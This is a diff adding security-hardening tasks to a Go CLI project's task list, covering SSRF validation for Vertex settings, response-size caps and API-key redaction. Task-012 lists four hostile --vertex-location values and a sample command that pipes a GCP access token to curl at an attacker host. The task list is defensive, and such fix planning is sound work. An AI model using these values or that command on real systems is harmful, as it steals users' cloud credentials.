@@ -332,3 +332,177 @@ tasks:
       - "`urlcheck.ValidateRemoteURL` still runs before the request is built so SSRF tests stay green"
     source: review
     completed_at: 2026-05-28T12:49:52Z
+
+  - id: task-012
+    title: "Validate VertexProject and VertexLocation against GCP naming patterns (SSRF + token exfil fix)"
+    description: |
+      Security review found a High-severity SSRF + OAuth bearer-token
+      exfiltration vector in the Vertex provider. `vertex.go` builds the
+      request host with raw string concatenation:
+      `vertexURLHostPrefix(p.cfg.VertexLocation)` →
+      `"https://" + location + "-aiplatform.googleapis.com"`.
+      `urlcheck.ValidateRemoteURL` runs AFTER that string is built and
+      only checks the post-parse `Host` field, so any `VertexLocation`
+      value whose URL parse separates the host from the
+      `-aiplatform.googleapis.com` suffix bypasses the check.
+
+      Verified attack values (each sends the user's cloud-platform-scoped
+      OAuth Bearer token to an attacker-controlled server):
+      - `--vertex-location 'evil.com#'` → request goes to `evil.com`
+      - `--vertex-location 'evil.com:8080/x'` → request goes to `evil.com:8080`
+      - `--vertex-location '@attacker.com'` → request goes to `attacker.com-aiplatform.googleapis.com`
+      - `--vertex-location 'x.attacker.com'` → request goes to `x.attacker.com-aiplatform.googleapis.com`
+
+      Realistic vector: a shared `credentials.json` or social-engineering
+      plants a credential with a malicious vertex-location. The next
+      `query --param q:embed=...` exfiltrates a ~1h GCP token granting
+      whatever the user's ADC identity owns — roughly equivalent to
+      `gcloud auth application-default print-access-token | curl
+      attacker.com -d @-`.
+
+      Fix at TWO layers (defense in depth):
+      1. **At credential-add time** in
+         `neo4j-cli/internal/subcommands/credential/embed/add.go`:
+         when `--provider vertex`, validate both flags against GCP's
+         naming rules and reject with `clierr.NewUsageError` BEFORE
+         storing.
+      2. **At Embed time** in `vertex.go`: validate again right after
+         the empty checks, BEFORE the URL is constructed. This catches
+         values written into `credentials.json` by direct file edit
+         (bypassing the CLI add path).
+
+      Patterns:
+      - `VertexLocation`: `^[a-z]+(-[a-z0-9]+)+$` (matches every real
+        GCP region: `us-central1`, `europe-west1`, `asia-northeast1`,
+        `northamerica-northeast2`, etc.).
+      - `VertexProject`: `^[a-z][a-z0-9-]{4,28}[a-z0-9]$` (6-30 chars,
+        starts with a letter, ends alphanumeric — matches GCP project
+        ID rules).
+
+      Tests: add explicit cases for the four attack strings in
+      `vertex_test.go` confirming `Embed` returns a `clierr.UsageError`
+      and NO HTTP request is dispatched. Use the existing test seam
+      machinery to assert no request goes out (e.g., fail the test if
+      the httptest handler fires). Add table-driven happy-path cases
+      for `us-central1`, `us-east1`, `europe-west1`,
+      `northamerica-northeast2`, `asia-southeast1`. Add equivalent
+      add-time tests in `add_test.go`.
+
+      Error messages: reference the offending value with `%q`, name
+      the flag (`--vertex-location` / `--vertex-project`), include a
+      sample of the expected format ("e.g. us-central1" / "must be a
+      GCP project ID like my-project-123").
+    status: pending
+    dependencies: []
+    acceptance_criteria:
+      - "Compiled regex constants for GCP region + project ID patterns exist as a single source of truth used by both `add.go` and `vertex.go`"
+      - "`vertexProvider.Embed` rejects malformed VertexLocation / VertexProject BEFORE URL construction or any HTTP dispatch"
+      - "`credential embed add --provider vertex` rejects malformed values BEFORE storing"
+      - "All four attack strings (`evil.com#`, `evil.com:8080/x`, `@attacker.com`, `x.attacker.com`) are rejected in tests for VertexLocation"
+      - "Five real GCP regions in the description are accepted in tests"
+      - "Equivalent coverage exists for VertexProject (≥2 attack cases + ≥2 legit cases)"
+      - "Tests assert NO HTTP request is dispatched when validation rejects (use a test seam or a failing handler)"
+      - "Error message references the offending value with `%q` and points the user at the right flag + expected format"
+      - "`make test`, `make fmt-check`, `make lint`, `make license-check` all pass"
+      - "`make generate-check` passes (no new bundle drift)"
+    source: review
+    completed_at: null
+
+  - id: task-013
+    title: "Cap happy-path response body read in doJSONRequest (DoS hardening)"
+    description: |
+      Security review found that `neo4j-cli/query/embed/httpjson.go`'s
+      happy path uses `raw, err := io.ReadAll(resp.Body)` with no size
+      limit. The error path correctly uses
+      `io.LimitReader(resp.Body, 4096)` but the success path doesn't.
+
+      A compromised proxy or an attacker-controlled `BaseURL` (gemini)
+      returning a 200 OK with a multi-GB body would exhaust memory.
+      Real embedding responses are <100 KB even at the full 3072 dims
+      gemini-embedding-001 returns.
+
+      Fix: wrap the happy-path read with
+      `io.LimitReader(resp.Body, 10<<20)` (10 MiB cap — ~100× the
+      largest legitimate embedding response, generous but blocks the
+      DoS surface). One-line change centralized in the helper; all 5
+      providers (openai, ollama, huggingface, gemini, vertex) are
+      hardened at once.
+
+      Test: add a case where the test server writes a body larger than
+      the cap (e.g., 11 MiB). Either of these is acceptable proof:
+      (a) the call returns a decode error because the truncated body
+      isn't valid JSON, or (b) the helper's returned bytes are exactly
+      10 MiB (the cap). The key invariant: the read does NOT allocate
+      the full 11 MiB.
+
+      Subtlety: if the body is exactly under the cap, behavior is
+      unchanged. At-or-over the cap the subsequent JSON decode fails
+      with "unexpected EOF" — that's the correct failure mode (caller
+      surfaces a decode error, not an OOM).
+    status: pending
+    dependencies:
+      - task-012
+    acceptance_criteria:
+      - "`doJSONRequest` happy-path read uses `io.LimitReader(resp.Body, 10<<20)` (or equivalent constant)"
+      - "Existing tests still pass unmodified"
+      - "A new test exercises an oversize body and confirms the read is bounded"
+      - "`make test`, `make fmt-check`, `make lint`, `make license-check` all pass"
+    source: review
+    completed_at: null
+
+  - id: task-014
+    title: "Scrub sensitive query params from URL in doJSONRequest network errors"
+    description: |
+      Security review found that Go's `net/http` includes the full
+      request URL in `client.Do` error strings (`Post
+      "https://host?key=AIza...": dial tcp ...`). If a user puts an API
+      key in the URL query string (Google's docs show both
+      `x-goog-api-key` header AND `?key=<key>` query auth styles),
+      network errors propagate the URL — and the key — into stderr,
+      telemetry, and any error-aggregating consumer.
+
+      The implementation correctly puts the gemini key in the
+      `x-goog-api-key` header (so this is opt-in user misconfiguration,
+      not a default flaw). But it's a sharp foot-gun, and the fix is
+      cheap and once-and-done in the new helper.
+
+      Fix: in `doJSONRequest`'s `request failed:` and `build request:`
+      branches (`httpjson.go`), scrub sensitive query parameters from
+      the URL in the wrapped error. Define an unexported helper inside
+      the embed package (e.g., `redactSensitiveURLParams(err error) error`)
+      that operates on the error's `Error()` string.
+
+      Implementation approach (simplest workable): regex match
+      `(?i)([?&](?:key|api_key|access_token|token)=)[^&"\s]+` and
+      replace the matched value with `${1}REDACTED`. Wrap as
+      `errors.New(redacted)` and return. This loses the wrapped error
+      chain but is robust to any URL format Go ever uses — document
+      the trade-off in a comment.
+
+      Apply ONLY at the `request failed:` and `build request:` wrap
+      sites in `doJSONRequest`. URL validation errors (`url rejected:`)
+      come from `urlcheck.ValidateRemoteURL` which already doesn't
+      echo the URL.
+
+      Tests:
+      - Unit test: call the redaction helper with crafted error
+        strings containing `?key=AIza...`, `&api_key=...`,
+        `?access_token=...`, `?token=...`; confirm each value is
+        replaced with `REDACTED` (case-insensitive).
+      - Integration test: point a provider at an `httptest.Server`
+        URL with a sensitive query param, close the connection
+        mid-read to force a network error, assert the resulting
+        error message contains `REDACTED` and NOT the original key
+        value.
+    status: pending
+    dependencies:
+      - task-012
+    acceptance_criteria:
+      - "Unexported helper in the embed package redacts known-sensitive query params from error strings"
+      - "Helper applied at `request failed:` and `build request:` wrap sites in `doJSONRequest`"
+      - "Unit tests cover `key`, `api_key`, `access_token`, `token` param redaction (case-insensitive)"
+      - "Integration test confirms redaction fires on a real network error path"
+      - "Existing provider tests still pass unmodified"
+      - "`make test`, `make fmt-check`, `make lint`, `make license-check` all pass"
+    source: review
+    completed_at: null
